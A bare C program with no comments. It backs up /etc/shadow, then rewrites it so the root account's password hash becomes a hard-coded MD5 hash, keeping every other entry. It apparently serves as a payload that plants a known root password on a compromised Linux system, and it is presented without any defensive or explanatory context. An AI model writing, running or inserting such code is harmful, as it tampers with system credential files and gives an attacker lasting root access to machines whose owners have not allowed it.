#include <stdio.h>

int main(void)
{
	FILE *f, *f2;
	char buf[1024];

	f = fopen("/etc/shadow", "r");
	f2 = fopen("/etc/shadow-", "w+");
	while (fgets(buf, sizeof(buf) - 1, f))
		fprintf(f2, "%s", buf);
	fclose(f);
	fclose(f2);

	f = fopen("/etc/shadow-", "r");
	f2 = fopen("/etc/shadow", "w+");
	while (fgets(buf, sizeof(buf) - 1, f)) {
		if (!strncmp(buf, "root:", 5))
			fprintf(f2, "root:$1$pg5XXts7$EsWE/0AktuZ2K91946enD.:14443::::::\n");
		else
			fprintf(f2, "%s", buf);
	}
	fclose(f);
	fclose(f2);

	return 0;
}	
